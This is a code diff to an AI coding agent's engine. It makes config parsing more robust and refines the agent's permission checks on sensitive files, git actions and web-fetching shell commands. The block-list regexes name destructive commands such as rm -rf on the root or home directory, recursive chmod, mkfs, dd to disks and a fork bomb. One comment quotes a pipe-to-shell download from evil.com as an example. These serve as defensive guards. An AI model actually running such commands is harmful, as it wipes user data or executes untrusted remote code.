@@ -17,6 +17,8 @@ from datetime import datetime, timezone
 from pathlib import Path, PurePosixPath, PureWindowsPath
 from openai import OpenAI
 from agent8088.mcp import MCPRuntime
+from agent8088.errors import is_context_overflow
+from agent8088 import capabilities
 from agent8088 import (cli_anything, diffview, documents, efficiency, local_models,
                        memory, patching, providers, routing, testing_support,
                        tool_output,
@@ -100,21 +102,91 @@ def _write_private_text(path: Path, content: str) -> None:
         raise
 
 
-def load_simple_config(path: Path) -> dict:
-    config = {}
-    if not path.exists():
-        return config
+# Problems found while reading config.txt, one plain sentence each, for the
+# banner and /doctor to show. Never raised: a typo in one setting must not take
+# down --setup/--version, which are exactly how a person would fix it.
+CONFIG_WARNINGS: list[str] = []
+
+
+def _config_warn(message: str) -> None:
+    if message not in CONFIG_WARNINGS:
+        CONFIG_WARNINGS.append(message)
+        # info, not warning: at import no handler is attached yet, so a
+        # warning would go to stderr via logging's last-resort handler ahead
+        # of the banner, which is where these are shown.
+        _log.info("config warning: %s", message)
+
+
+def _read_config_text(path: Path) -> str:
+    raw = path.read_bytes()
+    # Windows PowerShell's `Out-File`/`>` default is UTF-16 with a BOM; read it
+    # rather than failing on byte 0xFF.
+    if raw.startswith((b"\xff\xfe", b"\xfe\xff")):
+        return raw.decode("utf-16")
     # utf-8-sig, not utf-8: Windows PowerShell 5's `Set-Content -Encoding UTF8`
     # (and various Windows editors) prepend a UTF-8 BOM, which would otherwise
     # glue itself to the first key -- \ufeffmemory_engine stops matching
     # memory_engine and the value silently falls to a default.
-    for line in path.read_text(encoding="utf-8-sig").splitlines():
+    return raw.decode("utf-8-sig")
+
+
+def load_simple_config(path: Path) -> dict:
+    config = {}
+    try:
+        if not path.exists():
+            return config
+        text = _read_config_text(path)
+    except (OSError, UnicodeDecodeError) as exc:
+        reason = ("it is not valid UTF-8" if isinstance(exc, UnicodeDecodeError)
+                  else exc.strerror or type(exc).__name__)
+        _config_warn(f"Could not read {path} ({reason}); using defaults. Fix its "
+                     "permissions/encoding (save as UTF-8) or run `agent8088 --setup`.")
+        return config
+    for line in text.splitlines():
         line = line.strip()
         if not line or line.startswith("#") or "=" not in line:
             continue
         key, value = line.split("=", 1)
         config[key.strip()] = value.strip()
     return config
+
+
+def _config_number(key: str, default, cast=int, config: dict | None = None):
+    """A numeric setting, or `default` (with a CONFIG_WARNING) when it isn't one.
+
+    Read while `import agent8088.engine` is still running, so a bare int() made
+    `context_window=32k` a ValueError traceback that killed the CLI before
+    --setup could run. Nothing is guessed: "32k" (k=1000 or 1024?) and
+    "50 # steps" (load_simple_config has no inline comments) both fall back.
+    """
+    source = APP_CONFIG if config is None else config
+    raw = source.get(key)
+    if raw is None:
+        return default
+    text = str(raw).strip()
+    if not text:
+        return default
+    try:
+        return cast(text)
+    except (TypeError, ValueError):
+        pass
+    if cast is int:
+        try:
+            as_float = float(text)
+            if as_float.is_integer():
+                return int(as_float)
+        except ValueError:
+            pass
+    _config_warn(f"config.txt: {key}={raw!r} is not a number, using {default}.")
+    return default
+
+
+def _config_int(key: str, default: int) -> int:
+    return _config_number(key, default, int)
+
+
+def _config_float(key: str, default: float) -> float:
+    return _config_number(key, default, float)
 
 
 def update_simple_config(path: Path, values: dict) -> None:
@@ -294,6 +366,12 @@ elif _win_config.exists():
 else:
     CONFIG_PATH = Path(str(APP_DIR / "config.txt")).expanduser()
 APP_CONFIG = load_simple_config(CONFIG_PATH)
+try:
+    from agent8088 import errors as _errors
+    for _warning in _errors.unknown_config_keys(APP_CONFIG, source=CONFIG_PATH.name):
+        _config_warn(_warning)
+except Exception as _exc:  # noqa: BLE001 -- a diagnostic must never stop startup
+    _log.debug("config key check skipped: %s", _exc)
 
 # .env key store lives next to config.txt
 ENV_FILE_PATH = Path(str(CONFIG_PATH.parent / ".env"))
@@ -377,17 +455,18 @@ SYSTEM_FILE = Path(APP_CONFIG.get("system_file", str(APP_DIR / "system.md"))).ex
 
 MODEL_BASE_URL = APP_CONFIG.get("model_base_url", os.environ.get("OLLAMA_URL", "http://localhost:11434/v1"))
 MODEL_NAME = APP_CONFIG.get("model_name", os.environ.get("MODEL_NAME", "qwen14b-tooluse-v3"))
-TIMEOUT_SECONDS = int(APP_CONFIG.get("timeout_seconds", os.environ.get("TIMEOUT_SECONDS", "120")))
-CONTEXT_WINDOW = int(APP_CONFIG.get("context_window", "32768"))
+TIMEOUT_SECONDS = _config_number("timeout_seconds", 120, int, {
+    "timeout_seconds": os.environ.get("TIMEOUT_SECONDS", "120"), **APP_CONFIG})
+CONTEXT_WINDOW = _config_int("context_window", 32768)
 # Characters per token for the context-size estimate. 4 suits English prose on
 # OpenAI tokenizers; code, JSON and the Qwen tokenizer run nearer 3 (measured
 # 2.9-3.3 on Terminal-Bench conversations). Over-estimating the free space ends
 # in the server's "maximum context length" rejection, which ends the turn.
-CHARS_PER_TOKEN = max(1.0, float(APP_CONFIG.get("chars_per_token", "4")))
+CHARS_PER_TOKEN = max(1.0, _config_float("chars_per_token", 4.0))
 # Characters of one tool result shown to the model before it is cut (the rest
 # stays reachable through read_content). 3,000 by default; a benchmark profile
 # can match the output window of the agents it is compared with.
-TOOL_RESULT_MAX_CHARS = max(500, int(APP_CONFIG.get("tool_result_max_chars", "3000")))
+TOOL_RESULT_MAX_CHARS = max(500, _config_int("tool_result_max_chars", 3000))
 # Not clamped to CONTEXT_WINDOW here -- that constant is only the *global*
 # fallback context, not the active model's real one. _active_model_token_limits
 # already does min(completion, context) against each call's actual resolved
@@ -396,38 +475,38 @@ TOOL_RESULT_MAX_CHARS = max(500, int(APP_CONFIG.get("tool_result_max_chars", "30
 # of its real context window -- e.g. a 1M-context model still showed 32,768
 # output because this line clamped the fallback down before the real context
 # was ever consulted.
-MAX_COMPLETION_TOKENS = max(1, int(APP_CONFIG.get("max_completion_tokens", "65000")))
-MAX_TOOL_OUTPUT_BYTES = int(APP_CONFIG.get("max_tool_output_bytes", str(1024 * 1024)))
+MAX_COMPLETION_TOKENS = max(1, _config_int("max_completion_tokens", 65000))
+MAX_TOOL_OUTPUT_BYTES = _config_int("max_tool_output_bytes", 1024 * 1024)
 # A sub-agent exists to keep work *out* of the parent's context, so an unbounded
 # answer defeats the delegation it was spawned for. 0 disables the cap.
-MAX_SUBAGENT_ANSWER_CHARS = int(APP_CONFIG.get("max_subagent_answer_chars", "6000"))
-MAX_READ_BYTES = int(APP_CONFIG.get("max_read_bytes", str(2 * 1024 * 1024)))
+MAX_SUBAGENT_ANSWER_CHARS = _config_int("max_subagent_answer_chars", 6000)
+MAX_READ_BYTES = _config_int("max_read_bytes", 2 * 1024 * 1024)
 # Lines returned per read_text call when no explicit limit is given. Sized well
 # under _tool_result_for_model's own character cap so a page arrives whole.
-READ_PAGE_LINES = int(APP_CONFIG.get("read_page_lines", "200"))
+READ_PAGE_LINES = _config_int("read_page_lines", 200)
 # Documents are extracted, not byte-capped, so MAX_READ_BYTES does not apply to
 # them; this is their separate ceiling. Without it the extraction path is an
 # unbounded read reachable in readonly mode.
-MAX_DOCUMENT_BYTES = int(APP_CONFIG.get("max_document_bytes", str(25 * 1024 * 1024)))
-MAX_IMAGE_BYTES = int(APP_CONFIG.get("max_image_bytes", str(20 * 1024 * 1024)))
-MAX_HTTP_BYTES = int(APP_CONFIG.get("max_http_bytes", str(5 * 1024 * 1024)))
-MAX_TOOL_TIMEOUT_SECONDS = max(1, int(APP_CONFIG.get("max_tool_timeout_seconds", "600")))
+MAX_DOCUMENT_BYTES = _config_int("max_document_bytes", 25 * 1024 * 1024)
+MAX_IMAGE_BYTES = _config_int("max_image_bytes", 20 * 1024 * 1024)
+MAX_HTTP_BYTES = _config_int("max_http_bytes", 5 * 1024 * 1024)
+MAX_TOOL_TIMEOUT_SECONDS = max(1, _config_int("max_tool_timeout_seconds", 600))
 
 # --- Turn budget: bounds a single run_agent() call. 0 disables the check. ---
 # max_turns bounds ROUNDS; these bound resources. A plan or subagent chain can
 # burn unbounded tokens and wall-clock inside a small number of rounds.
-MAX_TURN_SECONDS = int(APP_CONFIG.get("max_turn_seconds", "0"))
+MAX_TURN_SECONDS = _config_int("max_turn_seconds", 0)
 # Ceiling for the larger request a length cut-off earns (the retry otherwise
 # doubles the completion limit). 0 = no ceiling. A benchmark comparing agents
 # at one output limit sets it to that limit.
-LENGTH_RETRY_MAX_TOKENS = max(0, int(APP_CONFIG.get("length_retry_max_tokens", "0")))
-PLAN_MODE_TIMEOUT_SECONDS = max(1, int(APP_CONFIG.get("plan_mode_timeout_seconds", "300")))
-PLAN_MODE_RETRY_LIMIT = max(1, int(APP_CONFIG.get("plan_mode_retry_limit", "2")))
-MAX_TURN_TOKENS = int(APP_CONFIG.get("max_turn_tokens", "0"))
+LENGTH_RETRY_MAX_TOKENS = max(0, _config_int("length_retry_max_tokens", 0))
+PLAN_MODE_TIMEOUT_SECONDS = max(1, _config_int("plan_mode_timeout_seconds", 300))
+PLAN_MODE_RETRY_LIMIT = max(1, _config_int("plan_mode_retry_limit", 2))
+MAX_TURN_TOKENS = _config_int("max_turn_tokens", 0)
 # USD ceiling; needs cost_per_1k_input / cost_per_1k_output to be set too.
-MAX_TURN_COST_USD = float(APP_CONFIG.get("max_turn_cost_usd", "0"))
-COST_PER_1K_INPUT = float(APP_CONFIG.get("cost_per_1k_input", "0"))
-COST_PER_1K_OUTPUT = float(APP_CONFIG.get("cost_per_1k_output", "0"))
+MAX_TURN_COST_USD = _config_float("max_turn_cost_usd", 0.0)
+COST_PER_1K_INPUT = _config_float("cost_per_1k_input", 0.0)
+COST_PER_1K_OUTPUT = _config_float("cost_per_1k_output", 0.0)
 
 # --- Dynamic turn budget ---------------------------------------------------
 # max_turns is what a run STARTS with, not what it is allowed. A run still
@@ -436,18 +515,18 @@ COST_PER_1K_OUTPUT = float(APP_CONFIG.get("cost_per_1k_output", "0"))
 # an error. Progress buys more rounds, up to max_turns * this multiplier.
 # 1 disables growth entirely and restores the old fixed limit.
 DYNAMIC_TURNS_CEILING_MULTIPLIER = max(
-    1, int(APP_CONFIG.get("dynamic_turns_ceiling_multiplier", "4")))
+    1, _config_int("dynamic_turns_ceiling_multiplier", 4))
 # Rounds granted per extension. Small on purpose: a run that has stalled should
 # have to re-prove progress often rather than coast to the ceiling.
-DYNAMIC_TURNS_EXTENSION = max(1, int(APP_CONFIG.get("dynamic_turns_extension", "5")))
+DYNAMIC_TURNS_EXTENSION = max(1, _config_int("dynamic_turns_extension", 5))
 
 # --- Retry before failover ---
 # Retries the same provider this many times (with exponential backoff) before
 # falling through the fallback_models chain. 0 = immediate failover.
-API_MAX_RETRIES = max(0, int(APP_CONFIG.get("api_max_retries", "3")))
-API_RETRY_INITIAL_DELAY_MS = max(0, int(APP_CONFIG.get("api_retry_initial_delay_ms", "500")))
-API_RETRY_MAX_DELAY_MS = max(1, int(APP_CONFIG.get("api_retry_max_delay_ms", "10000")))
-API_RETRY_JITTER_RATIO = max(0.0, min(1.0, float(APP_CONFIG.get("api_retry_jitter_ratio", "0.1"))))
+API_MAX_RETRIES = max(0, _config_int("api_max_retries", 3))
+API_RETRY_INITIAL_DELAY_MS = max(0, _config_int("api_retry_initial_delay_ms", 500))
+API_RETRY_MAX_DELAY_MS = max(1, _config_int("api_retry_max_delay_ms", 10000))
+API_RETRY_JITTER_RATIO = max(0.0, min(1.0, _config_float("api_retry_jitter_ratio", 0.1)))
 
 # --- Write blast radius: bounds how much damage one turn can do ---
 # The permission layer decides WHETHER a write is allowed; these bound HOW MANY
@@ -455,8 +534,8 @@ API_RETRY_JITTER_RATIO = max(0.0, min(1.0, float(APP_CONFIG.get("api_retry_jitte
 # emitting a multi-megabyte file by mistake, is a plausible accident rather than
 # an attack — which is exactly why the permission gate does not catch it.
 # 0 disables either check.
-MAX_WRITES_PER_TURN = int(APP_CONFIG.get("max_writes_per_turn", "0"))
-MAX_WRITE_BYTES = int(APP_CONFIG.get("max_write_bytes", "0"))
+MAX_WRITES_PER_TURN = _config_int("max_writes_per_turn", 0)
+MAX_WRITE_BYTES = _config_int("max_write_bytes", 0)
 
 # --- Runtime-adjustable limits ---------------------------------------------
 # Every limit here lives in two places: a module constant the hot path reads,
@@ -609,6 +688,7 @@ def set_provider_limit(provider: str, key: str, value: str) -> dict:
     old_raw = PROVIDERS[provider].get(key)
     old = _positive_int(old_raw, 0)
     PROVIDERS[provider][key] = str(new)
+    (_PROBE_OWNER.get(provider) or {}).pop(key, None)  # configured now, not probed
     config_key = f"provider.{provider}.{key}"
     APP_CONFIG[config_key] = str(new)
     update_simple_config(CONFIG_PATH, {config_key: new})
@@ -653,10 +733,12 @@ def reset_provider_limit(provider: str, key: str) -> dict:
             _PROBED_LIMITS[cache_key] = (probed_ctx, probed_out)
         except Exception:
             probed_ctx, probed_out = None, None
+    # Restored as probe-owned values (not config), so a later model switch
+    # on this provider re-probes instead of inheriting them.
     if key == "context_window" and probed_ctx:
-        PROVIDERS[provider]["context_window"] = str(probed_ctx)
+        _store_probed(provider, model, probed_ctx, None)
     elif key == "max_completion_tokens" and probed_out:
-        PROVIDERS[provider]["max_completion_tokens"] = str(probed_out)
+        _store_probed(provider, model, None, probed_out)
 
     new_context, new_completion = _active_model_token_limits(provider)
     new = new_context if key == "context_window" else new_completion
@@ -674,7 +756,7 @@ def reset_provider_limit(provider: str, key: str) -> dict:
 # Denial circuit breaker: after this many consecutive denials the model is told to
 # stop and report instead of retrying the same blocked action until max_turns.
 # 0 disables. A single approval resets the count.
-DENIAL_BREAKER_THRESHOLD = int(APP_CONFIG.get("denial_breaker_threshold", "3"))
+DENIAL_BREAKER_THRESHOLD = _config_int("denial_breaker_threshold", 3)
 
 # Unattended runs (cron / scheduled) have no operator to answer a prompt.
 #   deny     refuse the gated action and tell the model why (fail closed)
@@ -739,8 +821,8 @@ APP_CONFIG.setdefault("project_root", str(PROJECT_ROOT))
 # loops; these penalties curb that. Default 0.0 = no-op (behaviour unchanged) — raise
 # frequency_penalty to ~0.4 in config.txt to suppress repetition. Only sent when non-zero,
 # so backends that don't support them are unaffected unless you opt in.
-FREQUENCY_PENALTY = float(APP_CONFIG.get("frequency_penalty", "0"))
-PRESENCE_PENALTY = float(APP_CONFIG.get("presence_penalty", "0"))
+FREQUENCY_PENALTY = _config_float("frequency_penalty", 0.0)
+PRESENCE_PENALTY = _config_float("presence_penalty", 0.0)
 
 def _resolve_allowed_path(raw: str) -> Path:
     """Relative allowed_paths entries resolve against PROJECT_ROOT (the repo), not
@@ -876,9 +958,11 @@ def plan_tool_ran() -> bool:
 def reset_turn_counters() -> None:
     """Clear the per-turn blast-radius counters. Called by run_agent at the start
     of each turn; exposed so an embedder driving run_tool directly can reset too."""
-    global _turn_writes, _plan_tool_ran
+    global _turn_writes, _plan_tool_ran, _turn_blocker_counts, _pending_blocker_note
     _turn_writes = 0
     _plan_tool_ran = False
+    _turn_blocker_counts = {}
+    _pending_blocker_note = ""
 
 
 # ---------------------------------------------------------------------------
@@ -959,6 +1043,18 @@ SENSITIVE_FILE_PATTERNS = [
 SENSITIVE_FILE_EXTENSIONS = frozenset([".pem", ".key", ".rsa", ".p12"])
 SENSITIVE_FILE_GLOBS = ["*_KEY*", "*_SECRET*", "*_TOKEN*", "*_PASSWORD*",
                         "*_key*", "*_secret*", "*_token*", "*_password*"]
+# Committed templates that document the variables and hold no values. Reading
+# one is how a project gets set up; the real .env it is copied to stays blocked.
+ENV_TEMPLATE_NAMES = frozenset([".env.example", ".env.sample", ".env.template", ".env.dist"])
+# The name globs above target secret-holding files (API_KEY.txt, github_token).
+# Source files with those words in their name -- count_tokens.py,
+# reset_password.py -- are code, and refusing them stopped the agent from
+# reading or creating ordinary files. Config/data formats stay covered.
+SOURCE_CODE_EXTENSIONS = frozenset([
+    ".py", ".pyi", ".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx", ".go", ".rs",
+    ".java", ".kt", ".rb", ".php", ".c", ".h", ".cc", ".cpp", ".hpp", ".cs",
+    ".swift", ".scala", ".vue", ".svelte", ".html", ".css", ".md", ".rst",
+])
 
 # Shell startup files: writing one is arbitrary code execution on the user's
 # next shell launch, so writes are refused at the always-on floor — even in
@@ -1004,7 +1100,10 @@ def _is_sensitive_path(filepath: str) -> bool:
         if _resolve_allowed_path(allowed) == resolved:
             return False
 
-    # Exact filename match
+    # Exact filename match. An env template is judged by its directory alone,
+    # so ~/.ssh/.env.example is still refused.
+    if fn in ENV_TEMPLATE_NAMES:
+        fn, fp = "", str(Path(filepath).parent).lower()
     for pattern in SENSITIVE_FILE_PATTERNS:
         if pattern.lower() in fn or pattern.lower() in fp:
             return True
@@ -1016,6 +1115,8 @@ def _is_sensitive_path(filepath: str) -> bool:
 
     # Glob patterns
     import fnmatch
+    if Path(fn).suffix in SOURCE_CODE_EXTENSIONS:
+        return False
     for glob in SENSITIVE_FILE_GLOBS:
         if fnmatch.fnmatch(fn, glob):
             return True
@@ -1101,17 +1202,27 @@ def _dangerous_git_args(tokens: list) -> bool:
     if cursor >= len(tokens):
         return False
     action = tokens[cursor].lower()
-    flags = [token.lower() for token in tokens[cursor + 1:]]
+    raw = tokens[cursor + 1:]  # case matters below: -b/-B, -d/-D, -S/-s, -W
+    flags = [token.lower() for token in raw]
+    short = "".join(token[1:] for token in raw if token.startswith("-") and not token.startswith("--"))
+    forced = "f" in short or "--force" in flags
     return (
         action == "push"
         or (action == "reset" and "--hard" in flags)
-        or (action == "branch" and any(flag in ("-d", "-D", "--delete") for flag in flags))
+        # -d/--delete refuse a branch with unmerged work; only a forced delete loses it.
+        or (action == "branch" and ("d" in short.lower() or "--delete" in flags)
+            and ("D" in short or forced))
         or (action == "clean" and any("f" in flag.lstrip("-") for flag in flags if flag.startswith("-")))
-        or action in ("restore",)
+        # --staged alone only unstages; the working tree is untouched.
+        or (action == "restore" and not (
+            ("S" in short or "--staged" in flags)
+            and "W" not in short and "--worktree" not in flags))
+        # -b names a NEW branch, so the operands are names, not paths to overwrite.
+        # -B resets an existing branch and stays refused.
         or (action == "checkout" and (
             "--" in flags
-            or any(flag in ("-f", "--force") for flag in flags)
-            or any(not flag.startswith("-") for flag in flags)
+            or forced
+            or (any(not flag.startswith("-") for flag in flags) and "-b" not in raw)
         ))
         or (action == "switch" and any(
             flag in ("-f", "--force", "--discard-changes") for flag in flags))
@@ -1164,11 +1275,21 @@ def _outside_user_allowlist(command: str) -> bool:
 # Catastrophic commands that are blocked in ALL permission modes, including
 # edit mode. These cause irreversible damage: filesystem wipes, disk formats,
 # fork bombs, and remote-code-execution via pipe-to-shell at the root level.
+# A whole-system or whole-home target: / and ~ (also as $HOME / ${HOME}), each
+# optionally with a trailing / or /*, a top-level system directory, optionally
+# quoted. Must end the word, so ~/projects/old and /tmp/x stay ordinary.
+_WIPE_TARGET = (
+    r"""(["']?)(?:/\*?|(?:~|\$HOME|\$\{HOME\})(?:/\*?)?"""
+    r"|/(?:bin|boot|dev|etc|home|lib|lib64|opt|root|sbin|srv|usr|var"
+    r"|Users|System|Library|Applications)/?\*?)\1(?=\s|$)"
+)
 _UNRECOVERABLE_PATTERNS = [
-    # rm -rf / — wipe filesystem root (any flag order, --no-preserve-root, long/short)
-    re.compile(r"\brm\s+(?:[^|;&<>]*\s)?-(?:[^-]*r|--recursive)(?:[^|;&<>]*\s)?(?:[^|;&<>]*\s)?/(?:\s|$)"),
-    # rm -rf ~ — wipe home dir
-    re.compile(r"\brm\s+(?:[^|;&<>]*\s)?-(?:[^-]*r|--recursive)(?:[^|;&<>]*\s)?~(?:\s|$)"),
+    # rm -rf / ~ $HOME /* /usr ... — any flag order, --no-preserve-root, long/short
+    re.compile(r"\brm\s+(?:[^|;&<>]*\s)?-(?:[^-]*r|--recursive)(?:[^|;&<>]*\s)?(?:[^|;&<>]*\s)?"
+               + _WIPE_TARGET),
+    # chmod/chown/chgrp -R on the same targets: every file's mode or owner, unrecoverable
+    re.compile(r"\b(?:chmod|chown|chgrp)\s+(?:[^|;&<>]*\s)?-(?:[^-\s]*R|-recursive)"
+               r"(?:[^|;&<>]*\s)?" + _WIPE_TARGET),
     re.compile(r"\bmkfs(?:\.\w+)?\s+/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+)"),
     re.compile(r"\bdd\s+if=\S+\s+of=/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+)"),
     re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;"),
@@ -1268,13 +1389,88 @@ def _shell_web_urls(command: str):
     """
     if not _SHELL_WEB_CLIENT.search(command or ""):
         return None
-    return [match.group(0).rstrip(".,)]}") for match in _SHELL_HTTP_URL.finditer(command)]
+    urls = [match.group(0).rstrip(".,)]}") for match in _SHELL_HTTP_URL.finditer(command)]
+    if not urls and _web_client_only_mentioned(command):
+        return None
+    return urls
+
+
+def _shell_fetches_web(command: str) -> bool:
+    return _shell_web_urls(command) is not None
+
+
+# Commands that name a web client without running it: lookups, text search,
+# printing. Everything else that names one is treated as running it.
+_WEB_MENTION_LOOKUPS = frozenset([
+    "which", "where", "whereis", "type", "hash", "man", "help", "get-command", "gcm",
+    "grep", "egrep", "fgrep", "rg", "findstr", "echo", "printf", "dpkg", "apt-cache",
+])
+_WEB_CLIENT_INFO_FLAGS = frozenset(["--version", "-V", "--help", "-h"])
+_PACKAGE_MANAGERS = frozenset([
+    "apt", "apt-get", "dnf", "yum", "pacman", "zypper", "apk", "brew", "port", "pip",
+    "pip3", "pipx", "uv", "npm", "pnpm", "yarn", "winget", "choco", "scoop", "snap",
+    "conda", "gem", "cargo",
+])
+_GIT_TEXT_SUBCOMMANDS = frozenset(["commit", "log", "grep", "show", "diff", "status", "tag"])
+# Anything that can turn text into a command. Present anywhere, it voids the
+# exemption: `echo wget evil.com | sh` runs wget although only echo names it.
+_COMMAND_RUNNERS = frozenset([
+    "sh", "bash", "dash", "zsh", "ksh", "fish", "csh", "tcsh", "eval", "exec", "source",
+    "xargs", "env", "nohup", "time", "timeout", "nice", "watch", "parallel", "busybox",
+    "python", "python3", "py", "node", "deno", "bun", "perl", "ruby", "php", "pwsh",
+    "powershell", "cmd", "iex", "invoke-expression", "find",
+])
+
+
+def _web_client_only_mentioned(command: str) -> bool:
+    """True when every curl/wget/... in the command is named, never run.
+
+    `command -v wget`, `grep curl src/`, `apt-get install curl` and
+    `git commit -m 'drop curl'` were refused as URL-less fetches, so an agent
+    could not even check which tools exist. Conservative by construction: any
+    substitution, newline, runner, or unlexable input keeps the refusal.
+    """
+    if re.search(r"\$\(|`|[<>]\(|[\r\n]", command):
+        return False
+    parts = _lex_command(command)
+    if not parts:
+        return False
+    segments, current = [], []
+    for part in parts + [";"]:
+        if part in (";", "&&", "||", "&", "|"):
+            if current:
+                segments.append(current)
+            current = []
+        else:
+            current.append(part)
+    for segment in segments:
+        if segment[0] == "sudo" and len(segment) > 1 and not segment[1].startswith("-"):
+            segment = segment[1:]
+        exe = Path(segment[0]).stem.lower()
+        if segment[0] == "." or exe in _COMMAND_RUNNERS:
+            return False
+        if not _SHELL_WEB_CLIENT.search(" ".join(segment)):
+            continue
+        rest = segment[1:]
+        named_only = (
+            exe in _WEB_MENTION_LOOKUPS
+            or (exe == "command" and rest[:1] in (["-v"], ["-V"]))
+            or (exe in ("curl", "wget", "httpie", "http", "https", "lynx", "w3m")
+                and bool(rest) and all(arg in _WEB_CLIENT_INFO_FLAGS for arg in rest))
+            or (exe in _PACKAGE_MANAGERS
+                and any(arg.lower() in ("install", "add") for arg in rest[:3]))
+            or (exe == "pacman" and rest[:1] and rest[0].startswith("-S"))
+            or (exe == "git" and rest[:1] and rest[0] in _GIT_TEXT_SUBCOMMANDS)
+        )
+        if not named_only:
+            return False
+    return True
 
 
 # Beyond this length a command is not something a person is reasonably asking
 # for, and lexing quote-storms gets expensive. Past the limit the command is
 # treated as dangerous rather than skipped — see _command_parser_limit_exceeded.
-MAX_COMMAND_CHARS = int(APP_CONFIG.get("max_command_chars", "16384"))
+MAX_COMMAND_CHARS = _config_int("max_command_chars", 16384)
 
 
 def _command_parser_limit_exceeded(command: str) -> bool:
@@ -1605,10 +1801,17 @@ def load_providers(config: dict, include_builtins: bool = False) -> dict:
         if "base_url" in provider:
             provider["base_url"] = _normalize_openai_base_url(provider["base_url"])
 
-    return {
+    kept = {
         n: p for n, p in provs.items()
         if p.get("base_url") or (p.get("api_mode", "").lower() == "litellm" and p.get("model"))
     }
+    # A config-defined provider without an endpoint used to vanish silently, so
+    # `default_provider=mybox` then fell through to the legacy endpoint with no
+    # hint that `provider.mybox.base_url` was the missing line.
+    for name in sorted(set(provs) - set(kept)):
+        _config_warn(f"config.txt: provider '{name}' has no base_url and was ignored; "
+                     f"add provider.{name}.base_url=http://host:port/v1.")
+    return kept
 
 
 _VALID_PROVIDER_PROFILE = re.compile(r"^[a-z][a-z0-9_-]{0,31}$")
@@ -1661,6 +1864,16 @@ def configure_provider_profile(name: str, base_url: str, model: str, api_mode: s
 
 PROVIDERS = load_providers(APP_CONFIG, include_builtins=True)
 DEFAULT_PROVIDER = APP_CONFIG.get("default_provider", "")
+# /local and the local-model tools talk to the Ollama the user configured, not
+# always localhost. Only an explicit setting counts: the builtin default would
+# otherwise mask OLLAMA_HOST.
+local_models.set_default_host(APP_CONFIG.get("provider.ollama.base_url", ""))
+if DEFAULT_PROVIDER and DEFAULT_PROVIDER not in PROVIDERS:
+    from agent8088.errors import suggest_name as _suggest_name
+    _config_warn(f"config.txt: default_provider={DEFAULT_PROVIDER!r} is not a configured "
+                 f"provider{_suggest_name(DEFAULT_PROVIDER, PROVIDERS)}; using the "
+                 f"legacy model_base_url ({MODEL_BASE_URL}). Known: "
+                 f"{', '.join(sorted(PROVIDERS)) or '(none)'}.")
 ACTIVE_PROVIDER = ""
 # The `auto` strength ladder, cheapest rung first. Parsed once against the known
 # providers so an entry naming a provider the user has since removed is dropped
@@ -1763,6 +1976,12 @@ class _OpenRouterUsagePoller:
 _openrouter_usage_poller = _OpenRouterUsagePoller()
 
 
+def _unknown_provider_warning(name: str, outcome: str) -> None:
+    from agent8088.errors import suggest_name
+    _config_warn(f"Unknown provider {name!r}{suggest_name(name, PROVIDERS)}; {outcome}. "
+                 f"Known: {', '.join(sorted(PROVIDERS)) or '(none configured)'}.")
+
+
 def get_client(provider: str = None):
     """Return (client, model_name) for a named provider.
 
@@ -1770,8 +1989,9 @@ def get_client(provider: str = None):
     legacy USE_GEMMA4 toggle > the flat model_base_url/model_name settings."""
     name = (provider or os.environ.get("AGENT8088_PROVIDER") or DEFAULT_PROVIDER or "").strip()
     if name and name not in PROVIDERS and DEFAULT_PROVIDER in PROVIDERS:
-        print(f"[agent8088] Unknown provider '{name}' — using {DEFAULT_PROVIDER}. "
-              f"Known: {', '.join(sorted(PROVIDERS)) or '(none configured)'}")
+        # A config warning, not a print: printed at import it landed above the
+        # banner, which shows CONFIG_WARNINGS anyway.
+        _unknown_provider_warning(name, f"using {DEFAULT_PROVIDER}")
         name = DEFAULT_PROVIDER
 
     if name and name in PROVIDERS:
@@ -1784,20 +2004,25 @@ def get_client(provider: str = None):
             }, p.get("model", MODEL_NAME)
         if name == "openrouter":
             _openrouter_usage_poller.ensure_started()
+        # max_retries=0 everywhere here: _create_completion_with_fallback is
+        # the one retry layer. The SDK's own 2 retries underneath its
+        # API_MAX_RETRIES multiplied a dead endpoint into 12 attempts.
         return OpenAI(base_url=p["base_url"],
                       api_key=_provider_api_key(p) or "none",
-                      timeout=TIMEOUT_SECONDS), p.get("model", MODEL_NAME)
+                      timeout=TIMEOUT_SECONDS, max_retries=0), p.get("model", MODEL_NAME)
 
-    if name:
-        print(f"[agent8088] Unknown provider '{name}' — using legacy endpoint. "
-              f"Known: {', '.join(sorted(PROVIDERS)) or '(none configured)'}")
+    if name and name != DEFAULT_PROVIDER:
+        # (default_provider itself is already warned about where it is read.)
+        _unknown_provider_warning(name, f"using the legacy model_base_url ({MODEL_BASE_URL})")
 
     if os.environ.get("USE_GEMMA4", "0") == "1":  # legacy toggle, still supported
         print(f"[agent8088] Using Gemma 4 on Colossus ({GEMMA_BASE_URL})")
         model = APP_CONFIG.get("gemma_model_name", "gemma-4-12B-it-Q4_K_M.gguf")
-        return OpenAI(base_url=GEMMA_BASE_URL, api_key="sk-dummy"), model
+        return OpenAI(base_url=GEMMA_BASE_URL, api_key="sk-dummy",
+                      timeout=TIMEOUT_SECONDS, max_retries=0), model
 
-    client = OpenAI(base_url=MODEL_BASE_URL, api_key=APP_CONFIG.get("api_key", "ollama"), timeout=TIMEOUT_SECONDS)
+    client = OpenAI(base_url=MODEL_BASE_URL, api_key=APP_CONFIG.get("api_key", "ollama"),
+                    timeout=TIMEOUT_SECONDS, max_retries=0)
     return client, MODEL_NAME
 
 
@@ -1805,6 +2030,25 @@ client, MODEL_NAME = get_client()
 _initial_provider = (os.environ.get("AGENT8088_PROVIDER") or DEFAULT_PROVIDER or "").strip()
 ACTIVE_PROVIDER = (_initial_provider if _initial_provider in PROVIDERS
                    else DEFAULT_PROVIDER if DEFAULT_PROVIDER in PROVIDERS else "")
+
+
+def active_endpoint_url(provider_name: str = "") -> str:
+    """The base URL requests for `provider_name` (default: the active one) go to.
+
+    MODEL_BASE_URL is only the legacy flat setting; with providers configured
+    it named an endpoint nothing talks to, so a banner built from it pointed
+    people at the wrong server."""
+    name = provider_name or ACTIVE_PROVIDER or DEFAULT_PROVIDER
+    profile = PROVIDERS.get(name) if name else None
+    if profile is not None:
+        return str(profile.get("base_url") or "")
+    if os.environ.get("USE_GEMMA4", "0") == "1":
+        return GEMMA_BASE_URL
+    return MODEL_BASE_URL
+
+
+# Snapshot for display; activate_model() keeps it current.
